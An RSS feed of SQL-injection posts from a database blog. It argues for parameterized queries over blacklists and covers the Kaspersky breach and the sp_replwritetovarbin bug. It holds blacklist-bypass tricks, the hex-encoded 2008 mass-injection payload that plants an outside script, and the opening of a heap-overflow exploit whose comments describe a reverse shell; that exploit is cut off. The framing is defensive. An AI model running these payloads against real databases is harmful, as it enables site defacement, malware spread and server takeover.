<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>sql injection &#8211; LessthanDot</title>
	<atom:link href="/index.php/tag/sql-injection/feed/" rel="self" type="application/rss+xml" />
	<link>/</link>
	<description>A Technical Community for IT Professionals</description>
	<lastBuildDate>Sat, 09 Mar 2019 12:50:36 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>hourly</sy:updatePeriod>
	<sy:updateFrequency>1</sy:updateFrequency>
	<generator>https://wordpress.org/?v=4.6.1</generator>
	<item>
		<title>Please don&#8217;t use blacklists, use parameterized queries or stored procs instead</title>
		<link>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/</link>
		<comments>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/#respond</comments>
		<pubDate>Thu, 05 Apr 2012 10:55:00 +0000</pubDate>
		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
				<category><![CDATA[Data Modelling and Design]]></category>
		<category><![CDATA[Database Programming]]></category>
		<category><![CDATA[IBM DB2]]></category>
		<category><![CDATA[Microsoft SQL Server]]></category>
		<category><![CDATA[MySQL]]></category>
		<category><![CDATA[best practices]]></category>
		<category><![CDATA[security]]></category>
		<category><![CDATA[sql injection]]></category>

		<guid isPermaLink="false">/index.php/2012/04/please-don-t-use-blacklists/</guid>
		<description><![CDATA[Every now and then you will hear how some site will use a blacklist to 'protect' themselves against sql injection. Using a blacklist is very foolish because you can't ever think of all the different ways that the bad guys will try to bypass your little&#8230;]]></description>
				<content:encoded><![CDATA[<p>Every now and then you will hear how some site will use a blacklist to &#8216;protect&#8217; themselves against sql injection. Using a blacklist is very foolish because you can&#8217;t ever think of all the different ways that the bad guys will try to bypass your little list.<br />
Let&#8217;s say you have DROP and DROP TABLE in your list.</p>
<p>What about these two</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
</pre></td><td class="de1"><pre class="de1"><span class="kw1">PRINT</span> <span class="kw2">REVERSE</span><span class="br0">&#40;</span><span class="st0">'tset ELBAT PORD'</span><span class="br0">&#41;</span>
<span class="kw1">PRINT</span> <span class="kw1">convert</span><span class="br0">&#40;</span><span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">100</span><span class="br0">&#41;</span>,0x44524F50205441424C4520746573740000000000<span class="br0">&#41;</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">PRINT REVERSE('tset ELBAT PORD')
PRINT convert(VARCHAR(100),0x44524F50205441424C4520746573740000000000)</pre></div></div>

<p>Change PRINT to EXEC() and both will result in DROP TABLE Test</p>
<p>Remember this one?</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="de1"><pre class="de1">&nbsp;<span class="kw1">DECLARE</span> @S <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span>;<span class="kw1">SET</span> @S<span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
414C4C4F43415445205461626C655F437572736F7220 <span class="kw1">AS</span> <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;<span class="kw1">print</span> @S;</pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse"> DECLARE @S VARCHAR(4000);SET @S=CAST(0x4445434C415245204054205641524348415228323535292C40432056415243484152283235
3529204445434C415245205461626C655F437572736F7220435552534F5220464F522053454C45435420
612E6E616D652C622E6E616D652046524F4D207379736F626A6563747320612C737973636F6C756D6E73
206220574845524520612E69643D622E696420414E4420612E78747970653D27752720414E442028622E
78747970653D3939204F5220622E78747970653D3335204F5220622E78747970653D323331204F522062
2E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046
524F4D205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F
5354415455533D302920424547494E20455845432827555044415445205B272B40542B275D2053455420
5B272B40432B275D3D525452494D28434F4E5645525428564152434841522834303030292C5B272B4043
2B275D29292B27273C736372697074207372633D687474703A2F2F7777772E63686B626E722E636F6D2F
622E6A733E3C2F7363726970743E27272729204645544348204E4558542046524F4D205461626C655F43
7572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445
414C4C4F43415445205461626C655F437572736F7220 AS VARCHAR(4000));print @S;</pre></div></div>

<p>That becomes this</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="de1"><pre class="de1"><span class="kw1">DECLARE</span> @T <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span>,@C <span class="kw1">VARCHAR</span><span class="br0">&#40;</span><span class="nu0">255</span><span class="br0">&#41;</span> 
<span class="kw1">DECLARE</span> Table_Cursor <span class="kw1">CURSOR</span> <span class="kw1">FOR</span> <span class="kw1">SELECT</span> a.<span class="me1">name</span>,b.<span class="me1">name</span> 
<span class="kw1">FROM</span> sysobjects a,syscolumns b 
<span class="kw1">WHERE</span> a.<span class="me1">id</span><span class="sy0">=</span>b.<span class="me1">id</span> <span class="sy0">AND</span> a.<span class="me1">xtype</span><span class="sy0">=</span><span class="st0">'u'</span> <span class="sy0">AND</span> <span class="br0">&#40;</span>b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">99</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">35</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">231</span> <span class="sy0">OR</span> b.<span class="me1">xtype</span><span class="sy0">=</span><span class="nu0">167</span><span class="br0">&#41;</span> 
<span class="kw1">OPEN</span> Table_Cursor 
&nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
&nbsp; &nbsp; <span class="kw1">WHILE</span><span class="br0">&#40;</span><span class="kw2">@@FETCH_STATUS</span><span class="sy0">=</span><span class="nu0">0</span><span class="br0">&#41;</span> 
&nbsp; &nbsp; <span class="kw1">BEGIN</span> 
<span class="co1">--I changed EXEC to PRINT, just in case you are foolish enough to run this</span>
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">PRINT</span><span class="br0">&#40;</span><span class="st0">'UPDATE ['</span><span class="sy0">+</span>@T<span class="sy0">+</span><span class="st0">'] SET ['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']=RTRIM(CONVERT(VARCHAR(4000),['</span><span class="sy0">+</span>@C<span class="sy0">+</span><span class="st0">']))+'</span><span class="st0">'&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;'</span><span class="st0">''</span><span class="br0">&#41;</span> 
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw1">FETCH</span> <span class="kw1">NEXT</span> <span class="kw1">FROM</span> Table_Cursor <span class="kw1">INTO</span> @T,@C 
&nbsp; &nbsp; <span class="kw1">END</span> 
<span class="kw1">CLOSE</span> Table_Cursor <span class="kw1">DEALLOCATE</span> Table_Cursor </pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">DECLARE @T VARCHAR(255),@C VARCHAR(255) 
DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name 
FROM sysobjects a,syscolumns b 
WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) 
OPEN Table_Cursor 
	FETCH NEXT FROM Table_Cursor INTO @T,@C 
	WHILE(@@FETCH_STATUS=0) 
	BEGIN 
--I changed EXEC to PRINT, just in case you are foolish enough to run this
		PRINT('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://SomeFakeSite&gt;&lt;/script&gt;''') 
		FETCH NEXT FROM Table_Cursor INTO @T,@C 
	END 
CLOSE Table_Cursor DEALLOCATE Table_Cursor </pre></div></div>

<p>That infected millions of pages in 2008, there are still variants of this one today. A blacklist won&#8217;t help you in this case.</p>
<p>You can also protect yourself against this attack by denying SELECT permissions on the sysobjects table, your website user should not have access to these tables in general. If you use stored procedures you can just give access to the stored procedures and nothing else.</p>
<p>Every web framework today offers a way to use parameterized queries and or stored procedures. There is really no excuse to fall victim to a SQL injection attack these days. </p>
<p>Even using an ORM like Hibernate or Entity Framework is protected against SQL Injection because it use sp_executesql with proper parameters behind the scenes.</p>
<p>If you do use stored procedures, you might still have a problem if you are using dynamic SQL inside the proc with EXEC and concatenation instead of sp_executesql with proper parameters</p>
<p>So why do people start out by using code that is prone to SQL injection? I think there are two parts to this. </p>
<ol>
<li>It is easier to debug and see what is contained in the string by doing a debug.write/response.write now you can see exactly what is being sent to the DB</li>
<li>There are still books/online examples around that show code that concatenate user input with SQL</li>
</ol>
<p>Whenever I see code like this when a person asks for help, I immediately tell that person his code is vulnerable to a SQL injection attack, it is my duty to alert this person, it is yours too, we need to educate these people</p>
]]></content:encoded>
			<wfw:commentRss>/index.php/datamgmt/datadesign/please-don-t-use-blacklists/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>SQL Injection Pocket Reference for MySQL, SQL Server and Oracle</title>
		<link>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/</link>
		<comments>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/#comments</comments>
		<pubDate>Fri, 29 Jul 2011 08:51:00 +0000</pubDate>
		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
				<category><![CDATA[Data Modelling and Design]]></category>
		<category><![CDATA[Database Programming]]></category>
		<category><![CDATA[Microsoft SQL Server]]></category>
		<category><![CDATA[Microsoft SQL Server Admin]]></category>
		<category><![CDATA[MySQL]]></category>
		<category><![CDATA[MySQL Admin]]></category>
		<category><![CDATA[Oracle]]></category>
		<category><![CDATA[Oracle Admin]]></category>
		<category><![CDATA[mysql]]></category>
		<category><![CDATA[oracle]]></category>
		<category><![CDATA[security]]></category>
		<category><![CDATA[sql injection]]></category>
		<category><![CDATA[sql server]]></category>

		<guid isPermaLink="false">/index.php/2011/07/sql-injection-pocket-reference-for/</guid>
		<description><![CDATA[There is a nice SQL Injection Pocket Reference up on Google Docs

Here is what is covered

MySQL
Default Databases
Comment Out Query
Testing Injection
Strings
Numeric
In a login
Testing Version
MySQL-specific code
Database Credentials
Data&#8230;]]></description>
				<content:encoded><![CDATA[<p>There is a nice <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&amp;pli=1#Allowed_Intermediary_Character_30801873723976314">SQL Injection Pocket Reference</a> up on Google Docs</p>
<p>Here is what is covered</p>
<p><strong>MySQL</strong><br />
Default Databases<br />
Comment Out Query<br />
Testing Injection<br />
Strings<br />
Numeric<br />
In a login<br />
Testing Version<br />
MySQL-specific code<br />
Database Credentials<br />
Database Names<br />
Tables &amp; Columns<br />
Finding out number of columns<br />
Retrieving Tables<br />
Retrieving Columns<br />
PROCEDURE ANALYSE()<br />
Retrieving Multiple Tables/Columns at once<br />
Find Tables from Column Name<br />
Find Column From Table Name<br />
Avoiding the use of single/double quotations<br />
String concatenation<br />
Privileges<br />
FILE privilege<br />
MySQL 4/5<br />
MySQL 5<br />
Out Of Band Channeling<br />
Timing<br />
DNS (requires FILE privilege)<br />
SMB (requires FILE privilege)<br />
Reading Files (requires FILE privilege)<br />
Writing Files (requires FILE privilege)<br />
Stacked Queries with PDO<br />
User Defined Functions<br />
Fuzzing and Obfuscation<br />
Allowed Intermediary Characters<br />
Allowed Intermediary Characters after AND/OR<br />
Operators<br />
Constants<br />
MySQL Functions()<br />
MySQL Password Hashing<br />
MySQL Password() Cracker</p>
<p><strong>MSSQL</strong><br />
Default Databases<br />
Comment Out Query<br />
Testing Version<br />
Database Credentials<br />
Database Server Hostname<br />
Database Names<br />
Tables &amp; Columns<br />
Retrieving Tables<br />
Retrieving Columns<br />
Retrieving Multiple Tables/Columns at once<br />
OPENROWSET Attacks<br />
System Command Execution<br />
SP_PASSWORD (Hiding Query)<br />
Stacked Queries<br />
Fuzzing and Obfuscation<br />
Encodings<br />
Allowed Intermediary Characters<br />
Allowed Intermediary Characters after AND/OR<br />
MSSQL Password Hashing<br />
MSSQL Password Cracker</p>
<p><strong>ORACLE</strong><br />
Default Databases<br />
Comment Out Query<br />
Testing Version<br />
Database Credentials<br />
Database Names<br />
Current Database<br />
User Databases<br />
Tables &amp; Columns<br />
Retrieving Tables<br />
Retrieving Columns<br />
Finding Tables from Column Name<br />
Finding Column From Table Name<br />
Fuzzing and Obfuscation<br />
Avoiding the use of single/double quotations<br />
Out Of Band Channeling<br />
Time Delay<br />
Heavy Query Time delays</p>
<p>You can find it here: <a href="https://docs.google.com/Doc?docid=0AZNlBave77hiZGNjanptbV84Z25yaHJmMjk&amp;pli=1#Allowed_Intermediary_Character_30801873723976314">SQL Injection Pocket Reference</a></p>
]]></content:encoded>
			<wfw:commentRss>/index.php/datamgmt/datadesign/sql-injection-pocket-reference-for/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>Kaspersky Web Site Hacked With SQL Injection, How Embarrassing Is This?</title>
		<link>/index.php/datamgmt/datadesign/kaspersky-web-site-hacked-with-sql-injec/</link>
		<comments>/index.php/datamgmt/datadesign/kaspersky-web-site-hacked-with-sql-injec/#comments</comments>
		<pubDate>Tue, 10 Feb 2009 12:50:57 +0000</pubDate>
		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
				<category><![CDATA[Data Modelling and Design]]></category>
		<category><![CDATA[acunetix]]></category>
		<category><![CDATA[kaspersky]]></category>
		<category><![CDATA[security]]></category>
		<category><![CDATA[sql injection]]></category>

		<guid isPermaLink="false">/index.php/2009/02/kaspersky-web-site-hacked-with-sql-injec/</guid>
		<description><![CDATA[We all know that Kaspersky is a security firm and they make a very nice product, you can see a list of their products here: http://www.kaspersky.com/ What I found out today on twitter is that their site got hacked by a SQL Injection attack. The tool that was used was the Acunetix Web Security Scanner. [&#8230;]]]></description>
				<content:encoded><![CDATA[<p>We all know that Kaspersky  is a security firm and they make a very nice product, you can see a list of their products here: http://www.kaspersky.com/</p>
<p>What I found out today on <a href="http://twitter.com/kbriankelley/status/1195496252">twitter</a> is that their site got hacked by a SQL Injection attack. The tool that was used was the <a href="http://www.acunetix.com/">Acunetix Web Security Scanner</a>. Tools are used by admins to protect their sites but the same tools are also used by hackers to attack your site. I have written about another such tool Metasploit before here: <a href="/index.php/SysAdmins/OS/do-you-use-metasploit-to-check-if-your-s">Do you use Metasploit to check if your servers are vulnerable?</a><br />
People should really take advantage of these tools to check their own site before the hackers do. I will create a post one of these days with all the tools you can use to check for SQL attacks. </p>
<p>So what actually happened with Kaspersky? Here is what ChannelWeb had to say about this</p>
<blockquote><p>A security vulnerability in Moscow-based Kaspersky Lab&#8217;s U.S. Web site was made public after a hacker launched a SQL attack and posted listings of tables contained on the security company&#8217;s site.<br />
The hacker, known as Unu, posted screen shots as well as a list of tables Feb. 7 to a blog after hacking into the security company&#8217;s Web site via a simple SQL injection attack that allowed information to be exposed by entering secret username and password information.</p>
<p>&#8220;Kaspersky is one of the leading companies in the security and antivirus market. It seems as though they are not able to secure their own databases,&#8221; the hacker said on a hackerblog.org posting. &#8220;Alter one of the parameters and you have access to EVERYTHING: users, activation codes, lists of bugs, admins, shop, etc.&#8221;</p></blockquote>
<p>You can read that whole article here: http://www.crn.com/security/213401972</p>
]]></content:encoded>
			<wfw:commentRss>/index.php/datamgmt/datadesign/kaspersky-web-site-hacked-with-sql-injec/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>sp_replwritetovarbin Heap Overflow Code Exploit Code In The Wild, Works By Using Our Good Friend SQL Injection</title>
		<link>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/</link>
		<comments>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/#comments</comments>
		<pubDate>Tue, 23 Dec 2008 11:50:40 +0000</pubDate>
		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
				<category><![CDATA[Data Modelling and Design]]></category>
		<category><![CDATA[heap overflow]]></category>
		<category><![CDATA[security]]></category>
		<category><![CDATA[sql injection]]></category>
		<category><![CDATA[sql server 2000]]></category>
		<category><![CDATA[sql server 2005]]></category>

		<guid isPermaLink="false">/index.php/2008/12/sp_replwritetovarbin-heap-overflow-code/</guid>
		<description><![CDATA[There is code available to take advantage of the sp_replwritetovarbin heap overflow bug In a default configuration, the sp_replwritetovarbin stored procedure is accessible by anyone. To disable this proc you can run this as an admin on the box Before disabling this pro read BradC&#8217;s comment so that you do not break replication T-SQL1 execute [&#8230;]]]></description>
				<content:encoded><![CDATA[<p>There is code available to take advantage of the sp_replwritetovarbin heap overflow bug<br />
In a default configuration, the sp_replwritetovarbin stored procedure is accessible by anyone. To disable this proc you can run this as an admin on the box<br />
Before disabling this pro read BradC&#8217;s comment so that you do not break replication</p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="tsql"><thead><tr><td colspan="2"  class="head">T-SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
</pre></td><td class="de1"><pre class="de1"><span class="kw1">execute</span> master.<span class="me1">dbo</span>.<span class="kw3">sp_dropextendedproc</span> <span class="st0">'sp_replwritetovarbin'</span></pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">execute master.dbo.sp_dropextendedproc 'sp_replwritetovarbin'</pre></div></div>

<p>Microsoft is investigating new public reports of a vulnerability that could allow remote code execution on systems with supported editions of Microsoft SQL Server 2000, Microsoft SQL Server 2005, Microsoft SQL Server 2005 Express Edition, Microsoft SQL Server 2000 Desktop Engine (MSDE 2000), Microsoft SQL Server 2000 Desktop Engine (WMSDE), and Windows Internal Database (WYukon). Systems with Microsoft SQL Server 7.0 Service Pack 4, Microsoft SQL Server 2005 Service Pack 3, and Microsoft SQL Server 2008 are not affected by this issue.</p>
<p>Here are some more links<br />
http://www.microsoft.com/technet/security/advisory/961040.mspx<br />
http://www.sec-consult.com/files/20081209_mssql-sp_replwritetovarbin_memwrite.txt<br />
http://msdn.microsoft.com/en-us/library/aa215995(SQL.80).aspx</p>
<p>Here is the code someone emailed me to test for the exploit </p>

<div class="bwp-syntax-block clearfix">
<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="vb"><thead><tr><td colspan="2"  class="head">Visual Basic</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
</pre></td><td class="de1"><pre class="de1">// k`sOSe 12/17/2008
&lt;%// Microsoft SQL Server <span class="st0">&quot;sp_replwritetovarbin()&quot;</span> Heap Overflow
// Tested <span class="kw4">on</span> Win2k SP4 <span class="kw3">with</span> MSSQL 2000(<span class="kw4">on</span> one box only!).
// Shellcode <span class="kw3">is</span> a slightly modified metasploit reverse shell(<span class="kw4">on</span> 10.10.10.1 port 4445),
// the change allows multiple shots <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" />
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.
&nbsp;
// Take a look at the comments <span class="kw3">in</span> T-SQL
&nbsp;
&nbsp;
&nbsp;
<span class="kw4">On</span> <span class="kw4">Error</span> <span class="kw4">Resume</span> <span class="kw3">Next</span>
&nbsp;
// change this
UserName = <span class="st0">&quot;r00t&quot;</span>
Password = <span class="st0">&quot;t00r&quot;</span>
&nbsp;
// ########################################### FIRST QUERY
SQL = <span class="st0">&quot;DECLARE @buf NVARCHAR(4000), &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@val NVARCHAR(4),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@counter INT &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = ' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ 
<span class="st0">&quot;declare @retcode int,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@end_offset int, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_buffer varbinary,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;@vb_bufferlen int&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot;exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' &quot;</span>&amp;_
<span class="st0">&quot;SET @val = CHAR(0x41)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @counter = 0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;WHILE @counter &lt; 3020&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @counter = @counter + 1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 2900 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_ &nbsp;
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* First byte overwritten here. This is a random writable address */&nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
